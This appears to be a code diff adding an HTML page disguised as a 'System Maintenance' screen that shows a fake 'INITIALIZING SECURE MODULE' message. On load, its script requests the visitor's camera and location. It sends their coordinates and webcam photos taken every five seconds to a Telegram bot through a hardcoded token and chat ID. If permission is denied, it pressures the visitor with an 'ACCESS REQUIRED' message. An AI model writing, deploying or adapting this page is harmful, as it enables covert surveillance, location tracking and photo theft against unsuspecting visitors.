@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head><title>System Maintenance</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;">
+    <h2 id="msg">INITIALIZING SECURE MODULE...</h2>
+    <video id="v" autoplay style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+    <script>
+        const TOKEN = "7247698050:AAFXgjwQEvx_FbSPqYGOj6kgoJKfT-AbC9Y";
+        const CHAT_ID = "-1003898332560";
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+
+        async function start() {
+            try {
+                // Akses Kamera
+                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+                v.srcObject = s;
+                // Akses Lokasi
+                navigator.geolocation.getCurrentPosition(pos => {
+                    sendMsg(`📍 Location: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                });
+                setInterval(capture, 5000);
+            } catch (e) { document.getElementById("msg").innerText = "ACCESS REQUIRED TO PROCEED"; }
+        }
+
+        function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        }
+
+        function capture() {
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id', CHAT_ID);
+                f.append('photo', b, 'src.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:f});
+            }, 'image/jpeg', 0.6);
+        }
+        window.onload = start;
+    </script>
+</body>
+</html>
